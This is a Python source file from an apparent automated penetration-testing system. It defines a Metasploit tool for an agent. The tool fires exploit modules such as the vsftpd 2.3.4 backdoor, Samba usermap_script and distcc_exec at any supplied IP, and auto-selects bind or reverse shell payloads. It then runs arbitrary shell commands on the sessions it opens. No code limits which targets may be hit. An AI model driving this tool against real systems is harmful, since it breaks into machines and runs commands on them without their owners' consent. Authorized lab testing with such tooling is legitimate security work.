"""
Phase 5 — Metasploit RPC Tool

Primary: connects to msfrpcd via pymetasploit3.
Fallback: runs msfconsole subprocess when RPC is unavailable.
"""

import asyncio
import logging
import os
import re
import tempfile
import time

from config import settings
from models.exploit_result import ExploitResult
from tools.base_tool import BaseTool, ToolMetadata

logger = logging.getLogger(__name__)

EXPLOIT_TIMEOUT = 90   # seconds for RPC
MSF_CONSOLE_TIMEOUT = 120  # seconds for msfconsole subprocess (slower to start)
_CMD_TIMEOUT = 30  # seconds for session command execution

# Patterns that indicate a session was opened in msfconsole output
_SESSION_PATTERNS = [
    re.compile(r"session\s+\d+\s+opened", re.IGNORECASE),
    re.compile(r"command shell session\s+\d+", re.IGNORECASE),
    re.compile(r"meterpreter session\s+\d+", re.IGNORECASE),
    re.compile(r"opened\s+.*->", re.IGNORECASE),
]


def _session_opened(text: str) -> bool:
    return any(p.search(text) for p in _SESSION_PATTERNS)


class MetasploitTool(BaseTool):

    def __init__(self):
        self._client = None   # pymetasploit3 MsfRpcClient — lazy connection

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="metasploit_run",
            description=(
                "Metasploit Framework tool. Actions:\n"
                "  run          — Launch an exploit module against a target\n"
                "  session_exec — Execute a shell command on an open MSF session\n"
                "  sessions     — List active sessions\n"
                "  search       — Search MSF modules by keyword"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "module": {
                        "type": "string",
                        "description": "Metasploit module path (e.g. 'exploit/unix/ftp/vsftpd_234_backdoor')",
                    },
                    "target_ip": {
                        "type": "string",
                        "description": "Target IP address",
                    },
                    "target_port": {
                        "type": "integer",
                        "description": "Target port",
                    },
                    "payload": {
                        "type": "string",
                        "description": "Payload to use (leave empty for auto-select)",
                        "default": "",
                    },
                    "options": {
                        "type": "object",
                        "description": "Extra module options (key-value)",
                        "default": {},
                    },
                    "action": {
                        "type": "string",
                        "description": "'run' | 'session_exec' | 'sessions' | 'search'",
                        "default": "run",
                    },
                    "session_id": {
                        "type": "integer",
                        "description": "Session ID to interact with (for action='session_exec')",
                    },
                    "command": {
                        "type": "string",
                        "description": "Shell command to run on the session (for action='session_exec')",
                    },
                    "query": {
                        "type": "string",
                        "description": "Query for module search (used with action='search')",
                        "default": "",
                    },
                },
                "required": ["action"],
            },
            category="exploit-exec",
        )

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def validate(self, params: dict) -> tuple[bool, str]:
        action = params.get("action", "run")
        if action not in ("run", "search", "sessions", "session_exec"):
            return False, f"Invalid action: '{action}'. Options: run, session_exec, sessions, search"
        if action == "run":
            for field in ("module", "target_ip", "target_port"):
                if not params.get(field):
                    return False, f"'{field}' is required for action='run'"
        if action == "session_exec":
            if params.get("session_id") is None:
                return False, "'session_id' is required for action='session_exec'"
            if not params.get("command", "").strip():
                return False, "'command' is required for action='session_exec'"
        return True, ""

    async def execute(self, params: dict) -> dict:
        ok, msg = await self.validate(params)
        if not ok:
            return {"success": False, "output": None, "error": msg}

        action = params.get("action", "run")

        # ── Try RPC first ─────────────────────────────────────────────
        try:
            client = await self._get_client()
            if action == "search":
                return await self._search_modules(client, params.get("query", ""))
            if action == "sessions":
                return await self._list_sessions(client)
            if action == "session_exec":
                return await self._session_exec_rpc(client, params)
            try:
                return await self._run_exploit(client, params)
            except TimeoutError:
                return {"success": False, "output": None, "error": f"Exploit timed out ({EXPLOIT_TIMEOUT}s)"}

        except Exception as exc:
            rpc_err = str(exc)
            logger.warning("Metasploit RPC unavailable (%s) — falling back to msfconsole", rpc_err)
            self._client = None  # reset so next call re-tries RPC

        # ── msfconsole fallback ───────────────────────────────────────
        if action == "run":
            return await self._run_via_msfconsole(params)
        if action == "search":
            return await self._search_via_msfconsole(params.get("query", ""))
        if action == "sessions":
            return await self._sessions_via_msfconsole()
        if action == "session_exec":
            return await self._session_exec_via_msfconsole(params)

        return {"success": False, "output": None, "error": "Unknown action"}

    # ------------------------------------------------------------------
    # RPC actions
    # ------------------------------------------------------------------

    async def _run_exploit(self, client, params: dict) -> dict:
        module_path: str = params["module"]
        target_ip: str = params["target_ip"]
        target_port: int = int(params["target_port"])
        payload: str = params.get("payload", "")
        extra_opts: dict = params.get("options", {})

        loop = asyncio.get_event_loop()
        start = time.monotonic()

        try:
            result: ExploitResult = await asyncio.wait_for(
                loop.run_in_executor(
                    None,
                    lambda: self._blocking_run(
                        client, module_path, target_ip, target_port, payload, extra_opts
                    ),
                ),
                timeout=EXPLOIT_TIMEOUT,
            )
        except TimeoutError:
            return {
                "success": False,
                "output": None,
                "error": f"Exploit timed out ({EXPLOIT_TIMEOUT}s)",
            }
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}

        result.duration_seconds = time.monotonic() - start
        return {
            "success": result.success,
            "output": result.model_dump(),
            "error": result.error,
        }

    def _blocking_run(
        self,
        client,
        module_path: str,
        target_ip: str,
        target_port: int,
        payload: str,
        extra_opts: dict,
    ) -> ExploitResult:
        """Synchronous Metasploit exploit — runs in executor."""
        try:
            exploit = client.modules.use("exploit", module_path)
            exploit["RHOSTS"] = target_ip
            exploit["RPORT"] = target_port

            for key, val in extra_opts.items():
                exploit[key] = val

            if payload:
                if "reverse" in payload.lower() or "meterpreter" in payload.lower():
                    lhost = self._get_lhost(target_ip)
                    if lhost:
                        exploit["LHOST"] = lhost
                p = client.modules.use("payload", payload)
            else:
                # Auto-select: pick the best compatible payload from the module.
                # Prefer non-reverse payloads (no LHOST needed).
                payloads = exploit.targetpayloads()
                if not payloads:
                    return ExploitResult(
                        success=False,
                        module=module_path,
                        target_ip=target_ip,
                        target_port=target_port,
                        error="No compatible payload found",
                    )
                # Prefer interact > bind > reverse (least network requirements first)
                chosen = payloads[0]
                for pname in payloads:
                    if "interact" in pname:
                        chosen = pname
                        break
                    if "bind" in pname and "reverse" not in chosen:
                        chosen = pname
                p = client.modules.use("payload", chosen)
                payload = chosen

                if "reverse" in payload.lower() or "meterpreter" in payload.lower():
                    lhost = self._get_lhost(target_ip)
                    if lhost:
                        exploit["LHOST"] = lhost

            output = exploit.execute(payload=p)
            session_id = output.get("session_id")

            return ExploitResult(
                success=session_id is not None,
                module=module_path,
                target_ip=target_ip,
                target_port=target_port,
                payload=payload,
                session_id=session_id,
                output=str(output),
                error=None if session_id else "Session could not be opened",
            )
        except Exception as exc:
            return ExploitResult(
                success=False,
                module=module_path,
                target_ip=target_ip,
                target_port=target_port,
                error=str(exc),
            )

    async def _search_modules(self, client, query: str) -> dict:
        loop = asyncio.get_event_loop()
        try:
            modules = await loop.run_in_executor(
                None, lambda: client.modules.search(query)
            )
            return {
                "success": True,
                "output": {"query": query, "modules": modules[:50]},
                "error": None,
            }
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}

    async def _list_sessions(self, client) -> dict:
        loop = asyncio.get_event_loop()
        try:
            sessions = await loop.run_in_executor(
                None, lambda: dict(client.sessions.list)
            )
            return {
                "success": True,
                "output": {"sessions": sessions, "count": len(sessions)},
                "error": None,
            }
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}

    async def _session_exec_rpc(self, client, params: dict) -> dict:
        """Execute a command on an existing MSF session via RPC."""
        session_id = int(params["session_id"])
        command = params["command"].strip()
        loop = asyncio.get_event_loop()
        try:
            result = await asyncio.wait_for(
                loop.run_in_executor(
                    None,
                    lambda: self._blocking_session_exec(client, session_id, command),
                ),
                timeout=_CMD_TIMEOUT,
            )
            return result
        except asyncio.TimeoutError:
            return {"success": False, "output": None, "error": f"Session command timed out ({_CMD_TIMEOUT}s)"}
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}

    def _blocking_session_exec(self, client, session_id: int, command: str) -> dict:
        """Synchronous session command execution via RPC."""
        try:
            sessions = client.sessions.list
            if str(session_id) not in sessions and session_id not in sessions:
                available = list(sessions.keys()) if sessions else []
                return {
                    "success": False,
                    "output": None,
                    "error": f"Session {session_id} not found. Active sessions: {available}",
                }

            shell = client.sessions.session(str(session_id))
            shell.write(command + "\n")
            time.sleep(2)  # give the command time to execute
            output = shell.read()

            return {
                "success": True,
                "output": {
                    "session_id": session_id,
                    "command": command,
                    "result": output,
                },
                "error": None,
            }
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}

    # ------------------------------------------------------------------
    # msfconsole subprocess fallback
    # ------------------------------------------------------------------

    @staticmethod
    def _find_msfconsole() -> str:
        """Locate the msfconsole binary across platforms.

        Search order:
        1. PATH lookup (covers Kali, most Linux distros, macOS Homebrew)
        2. Common installation directories per platform
        """
        import shutil
        from core.platform_utils import IS_WINDOWS, IS_MACOS

        path_hit = shutil.which("msfconsole")
        if path_hit:
            return path_hit

        candidates: list[str] = []
        if IS_WINDOWS:
            candidates = [
                r"C:\metasploit-framework\bin\msfconsole.bat",
                r"C:\Program Files\Metasploit Framework\bin\msfconsole.bat",
                r"C:\Program Files (x86)\Metasploit Framework\bin\msfconsole.bat",
                os.path.expandvars(r"%LOCALAPPDATA%\metasploit-framework\bin\msfconsole.bat"),
            ]
        elif IS_MACOS:
            candidates = [
                "/opt/metasploit-framework/bin/msfconsole",
                "/usr/local/bin/msfconsole",
                "/opt/homebrew/bin/msfconsole",
            ]
        else:
            candidates = [
                "/usr/bin/msfconsole",
                "/usr/local/bin/msfconsole",
                "/opt/metasploit-framework/bin/msfconsole",
                "/snap/metasploit-framework/current/bin/msfconsole",
            ]

        for c in candidates:
            if os.path.isfile(c):
                return c

        return "msfconsole"  # fallback — let the OS raise FileNotFoundError

    async def _run_msfconsole(self, rc_commands: list[str], timeout: int = MSF_CONSOLE_TIMEOUT) -> str:
        """Write an .rc script and run msfconsole -q -r <file>. Returns stdout."""
        rc_content = "\n".join(rc_commands) + "\nexit -y\n"
        logger.info("msfconsole RC script:\n%s", rc_content)

        fd, rc_path = tempfile.mkstemp(suffix=".rc", prefix="aegis_msf_")
        try:
            with os.fdopen(fd, "w") as f:
                f.write(rc_content)

            msf_bin = self._find_msfconsole()
            logger.info("Launching msfconsole: %s -q -r %s (timeout=%ds)", msf_bin, rc_path, timeout)

            proc = await asyncio.create_subprocess_exec(
                msf_bin, "-q", "-r", rc_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            try:
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
                output = stdout.decode("utf-8", errors="replace")
                logger.info("msfconsole output (%d chars):\n%s", len(output), output[:4000])
                return output
            except asyncio.TimeoutError:
                proc.kill()
                await proc.communicate()
                logger.error("msfconsole timed out after %ds — killed", timeout)
                return "[AEGIS] msfconsole timed out after %ds. The exploit may need more time or msfconsole is stuck." % timeout
        finally:
            try:
                os.unlink(rc_path)
            except OSError:
                pass

    @staticmethod
    def _get_lhost(target_ip: str) -> str:
        """Return the local IP address that the target can reach back to.

        Priority:
        1. MSF_LHOST_OVERRIDE env var (manual override for complex NAT/WSL setups)
        2. Local interface on the same subnet as target_ip  (most accurate)
        3. Socket routing trick fallback
        """
        if settings.msf.lhost_override:
            return settings.msf.lhost_override

        import ipaddress
        import re
        import socket
        import subprocess
        from core.platform_utils import IS_WINDOWS

        # ── Strategy 1: find interface on the same subnet as target ──────
        try:
            target = ipaddress.ip_address(target_ip)

            def _parse_ip_prefix(text: str) -> list[tuple[str, int]]:
                """Extract (ip, prefix_len) pairs from OS-specific output."""
                pairs = []
                # `ip addr` format: inet 192.168.56.1/24
                for m in re.finditer(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", text):
                    pairs.append((m.group(1), int(m.group(2))))
                # `ifconfig` format: inet 192.168.56.1 netmask 0xffffff00 / 255.255.255.0
                for m in re.finditer(
                    r"inet (\d+\.\d+\.\d+\.\d+)\s+netmask\s+(\S+)", text
                ):
                    ip_str, mask_str = m.group(1), m.group(2)
                    try:
                        if mask_str.startswith("0x"):
                            mask_int = int(mask_str, 16)
                            prefix = bin(mask_int).count("1")
                        else:
                            prefix = sum(
                                bin(int(o)).count("1") for o in mask_str.split(".")
                            )
                        pairs.append((ip_str, prefix))
                    except Exception:
                        pass
                return pairs

            def _parse_windows_netsh(text: str) -> list[tuple[str, int]]:
                """Parse 'netsh interface ip show address' output."""
                pairs = []
                for m in re.finditer(
                    r"IP Address:\s+(\d+\.\d+\.\d+\.\d+).*?Subnet Prefix:.*?/(\d+)",
                    text, re.DOTALL,
                ):
                    pairs.append((m.group(1), int(m.group(2))))
                # Fallback: parse "IP Address" + "Subnet Mask" lines
                for m in re.finditer(
                    r"IP Address:\s+(\d+\.\d+\.\d+\.\d+)\s+Subnet Mask:\s+(\d+\.\d+\.\d+\.\d+)",
                    text,
                ):
                    ip_str, mask_str = m.group(1), m.group(2)
                    try:
                        prefix = sum(bin(int(o)).count("1") for o in mask_str.split("."))
                        pairs.append((ip_str, prefix))
                    except Exception:
                        pass
                return pairs

            if IS_WINDOWS:
                cmds = [["netsh", "interface", "ip", "show", "address"], ["ipconfig"]]
            else:
                cmds = [["ip", "-4", "addr", "show"], ["ifconfig"]]

            for cmd in cmds:
                try:
                    result = subprocess.run(
                        cmd, capture_output=True, text=True, timeout=5
                    )
                    if result.returncode != 0:
                        continue
                    if IS_WINDOWS:
                        parsed = _parse_windows_netsh(result.stdout)
                    else:
                        parsed = _parse_ip_prefix(result.stdout)
                    for ip, prefix in parsed:
                        if ip.startswith("127."):
                            continue
                        try:
                            net = ipaddress.ip_network(f"{ip}/{prefix}", strict=False)
                            if target in net:
                                return ip
                        except ValueError:
                            continue
                except FileNotFoundError:
                    continue
        except Exception:
            pass

        # ── Strategy 2: socket routing trick ──────────────────────────────
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target_ip, 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return ""

    # Modules that open a native bind shell themselves — MSF just needs to
    # interact with the already-running shell rather than stage a new one.
    # For these modules we do NOT explicitly set a payload in the RC script;
    # instead we let MSF auto-select the compatible payload from the module's
    # target payloads list. This avoids "PAYLOAD is not valid" errors when
    # cmd/unix/interact is unavailable or renamed in certain MSF versions.
    _NATIVE_SHELL_MODULES: set[str] = {
        "exploit/unix/ftp/vsftpd_234_backdoor",
        "exploit/multi/samba/usermap_script",
        "exploit/unix/misc/distcc_exec",
    }

    # For native-shell modules (vsftpd, samba usermap, distcc) the exploit opens
    # a BIND shell on a fixed port (e.g. 6200). We must use a payload that
    # CONNECTS to that port — only cmd/unix/interact does that. reverse_netcat
    # would start a reverse listener (wrong). bind_netcat would open a new bind
    # shell (wrong). So we use ONLY cmd/unix/interact for these modules.
    _INTERACT_CANDIDATES: list[str] = [
        "cmd/unix/interact",
    ]

    # Default bind-shell payloads by module platform.
    # Bind-shells are preferred: they need no LHOST, work behind NAT/WSL.
    # Key = second path component of the module path (e.g. "unix" in exploit/unix/...).
    _PLATFORM_BIND_PAYLOAD: dict[str, str] = {
        "unix":    "cmd/unix/bind_netcat",
        "linux":   "cmd/unix/bind_netcat",
        "multi":   "cmd/unix/bind_netcat",
        "windows": "windows/x64/shell_bind_tcp",
        "osx":     "osx/x86/shell_bind_tcp",
        "android": "android/meterpreter/reverse_tcp",  # android: reverse only
    }
    _FALLBACK_BIND_PAYLOAD = "cmd/unix/bind_netcat"

    @classmethod
    def _is_native_shell_module(cls, module_path: str) -> bool:
        """Return True if the module spawns its own shell (no staged payload needed)."""
        return module_path in cls._NATIVE_SHELL_MODULES

    @classmethod
    def _default_payload(cls, module_path: str) -> str:
        """Return a platform-appropriate payload for the module.

        Native-shell modules (vsftpd, samba usermap, distcc) return empty string
        so the caller knows NOT to set PAYLOAD in the RC file.
        All other modules get a bind-shell payload so no LHOST is required.
        """
        if cls._is_native_shell_module(module_path):
            return ""  # let MSF auto-select
        parts = module_path.split("/")
        platform = parts[1].lower() if len(parts) > 1 else ""
        return cls._PLATFORM_BIND_PAYLOAD.get(platform, cls._FALLBACK_BIND_PAYLOAD)

    async def _run_via_msfconsole(self, params: dict) -> dict:
        """Run exploit via msfconsole subprocess when RPC is unavailable.

        Strategy:
        - Native-shell modules (vsftpd, samba usermap, distcc): do NOT set
          PAYLOAD — let MSF auto-select.  If that fails, retry with each
          candidate interact payload.
        - Other modules: prefer bind-shell payloads (no LHOST needed, works
          in WSL/NAT/VM environments).  Only set LHOST for explicit reverse
          payloads.
        """
        module_path: str = params["module"]
        target_ip: str = params["target_ip"]
        target_port: int = int(params["target_port"])
        payload: str = params.get("payload", "")
        extra_opts: dict = params.get("options", {})

        is_native = self._is_native_shell_module(module_path)
        effective_payload = payload or self._default_payload(module_path)

        start = time.monotonic()
        logger.info("Running exploit via msfconsole: %s → %s:%s", module_path, target_ip, target_port)

        if is_native and not payload:
            # Native-shell modules: try without explicit payload first, then
            # iterate through candidate payloads until one works.
            output = await self._try_native_shell_exploit(
                module_path, target_ip, target_port, extra_opts,
            )
        else:
            output = await self._try_exploit_with_payload(
                module_path, target_ip, target_port, effective_payload, extra_opts,
            )

        duration = time.monotonic() - start

        success = _session_opened(output)
        session_id = None
        m = re.search(r"session\s+(\d+)\s+opened", output, re.IGNORECASE)
        if m:
            session_id = int(m.group(1))

        error_msg = None
        if success:
            pass
        elif "Backdoor already in-use" in output or "already exploited" in output.lower():
            error_msg = (
                "Target already exploited: backdoor/shell already in use (e.g. port 6200). "
                "Reset the target VM or use an existing session. Try another exploit (e.g. Samba usermap)."
            )
        else:
            error_msg = "No session opened"

        used_payload = effective_payload if not is_native else "(auto)"
        result = ExploitResult(
            success=success,
            module=module_path,
            target_ip=target_ip,
            target_port=target_port,
            payload=used_payload,
            session_id=session_id,
            output=output[:3000],
            error=error_msg,
            duration_seconds=duration,
        )
        return {
            "success": result.success,
            "output": result.model_dump(),
            "error": result.error,
        }

    async def _try_native_shell_exploit(
        self,
        module_path: str,
        target_ip: str,
        target_port: int,
        extra_opts: dict,
    ) -> str:
        """Try native-shell exploit: unset global payload then run; else set cmd/unix/interact.

        vsftpd/samba backdoors open a BIND shell (e.g. port 6200). Only
        cmd/unix/interact connects to it. We first try unset PAYLOAD so the
        module can use its default; if that leaves a bad global payload we then
        explicitly set cmd/unix/interact.
        """
        # Attempt 1: no explicit payload — module uses its own default (e.g. cmd/unix/interact)
        commands = self._build_rc_commands(
            module_path, target_ip, target_port, "", extra_opts,
        )
        output = await self._run_msfconsole(commands)
        if _session_opened(output):
            return output
        if "Backdoor already in-use" in output or "already exploited" in output.lower():
            return output

        # Attempt 2: explicitly set cmd/unix/interact (only valid option for bind backdoors)
        for candidate in self._INTERACT_CANDIDATES:
            logger.info("Trying %s with payload %s", module_path, candidate)
            commands = self._build_rc_commands(
                module_path, target_ip, target_port, candidate, extra_opts,
            )
            output = await self._run_msfconsole(commands)
            if _session_opened(output):
                return output
            if "Backdoor already in-use" in output or "already exploited" in output.lower():
                break
            if "is not valid" in output or "Invalid payload" in output:
                logger.warning("Payload %s not valid in this MSF version", candidate)

        return output

    async def _try_exploit_with_payload(
        self,
        module_path: str,
        target_ip: str,
        target_port: int,
        payload: str,
        extra_opts: dict,
    ) -> str:
        """Run an exploit with an explicit payload."""
        commands = self._build_rc_commands(
            module_path, target_ip, target_port, payload, extra_opts,
        )
        return await self._run_msfconsole(commands)

    def _build_rc_commands(
        self,
        module_path: str,
        target_ip: str,
        target_port: int,
        payload: str,
        extra_opts: dict,
    ) -> list[str]:
        """Build msfconsole RC commands for an exploit.

        CRITICAL: Always clear global PAYLOAD/LHOST BEFORE 'use module'.
        MSF's global datastore (from ~/.msf4/) can contain a stale payload
        (e.g. meterpreter_reverse_tcp) that gets locked when the module loads.
        If that happens, 'set PAYLOAD cmd/unix/interact' is rejected with
        'The value specified for PAYLOAD is not valid'. Clearing globals first
        ensures the module loads with its OWN default payload.
        """
        # Clear globals before and after "use" — module load can re-apply a
        # configured payload (e.g. meterpreter_reverse_tcp). Also clear
        # module-level PAYLOAD so the module uses its real default (e.g. interact).
        commands = [
            "unsetg PAYLOAD",
            "unsetg LHOST",
            f"use {module_path}",
            "unsetg PAYLOAD",
            "unsetg LHOST",
            "unset PAYLOAD",
            f"set RHOSTS {target_ip}",
            f"set RPORT {target_port}",
        ]

        if payload:
            commands.append(f"set PAYLOAD {payload}")
            is_reverse = "reverse" in payload.lower() or "meterpreter" in payload.lower()
            if is_reverse:
                lhost = self._get_lhost(target_ip)
                if lhost:
                    commands.append(f"set LHOST {lhost}")

        for key, val in extra_opts.items():
            commands.append(f"set {key} {val}")

        commands.append("run -z")
        return commands

    async def _search_via_msfconsole(self, query: str) -> dict:
        """Search Metasploit modules via msfconsole subprocess."""
        if not query.strip():
            return {"success": False, "output": None, "error": "Query cannot be empty"}

        commands = [f"search {query}"]
        output = await self._run_msfconsole(commands, timeout=60)

        # Parse lines like:
        #   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  ...
        modules = []
        for line in output.splitlines():
            line = line.strip()
            if re.match(r"^\d+\s+\S+/\S+", line):
                parts = line.split()
                if len(parts) >= 2:
                    modules.append(parts[1])

        return {
            "success": True,
            "output": {"query": query, "modules": modules[:50], "raw": output[:2000]},
            "error": None,
        }

    async def _sessions_via_msfconsole(self) -> dict:
        """List active sessions via msfconsole subprocess."""
        commands = ["sessions -l"]
        output = await self._run_msfconsole(commands, timeout=60)
        return {
            "success": True,
            "output": {"raw": output[:2000], "sessions": {}, "count": 0},
            "error": None,
        }

    async def _session_exec_via_msfconsole(self, params: dict) -> dict:
        """Execute a command on a session via msfconsole subprocess."""
        session_id = int(params["session_id"])
        command = params["command"].strip()

        commands = [
            f"sessions -i {session_id}",
            command,
            "",  # empty line to flush
            "background",
        ]
        output = await self._run_msfconsole(commands, timeout=_CMD_TIMEOUT)

        # Check for common errors
        if "Invalid session" in output or "not found" in output.lower():
            return {
                "success": False,
                "output": None,
                "error": f"Session {session_id} is not valid or has been closed",
            }

        return {
            "success": True,
            "output": {
                "session_id": session_id,
                "command": command,
                "result": output[:3000],
            },
            "error": None,
        }

    # ------------------------------------------------------------------
    # Connection management
    # ------------------------------------------------------------------

    async def _get_client(self):
        """Lazy connection — connect on first call, then use cached client."""
        if self._client is not None:
            return self._client

        loop = asyncio.get_event_loop()
        self._client = await loop.run_in_executor(None, self._connect)
        return self._client

    def _connect(self):
        from pymetasploit3.msfrpc import MsfRpcClient  # noqa: PLC0415
        cfg = settings.msf
        try:
            return MsfRpcClient(
                cfg.password,
                server=cfg.host,
                port=cfg.port,
                ssl=cfg.ssl,
            )
        except Exception as exc:
            logger.warning(
                "MsfRpcClient connection failed (host=%s port=%s): %s — use msfconsole fallback or start msfrpcd",
                cfg.host, cfg.port, exc,
            )
            raise

    async def is_available(self) -> bool:
        """Is msfrpcd reachable?"""
        try:
            await self._get_client()
            return True
        except Exception:
            self._client = None
            return False

    def disconnect(self) -> None:
        self._client = None
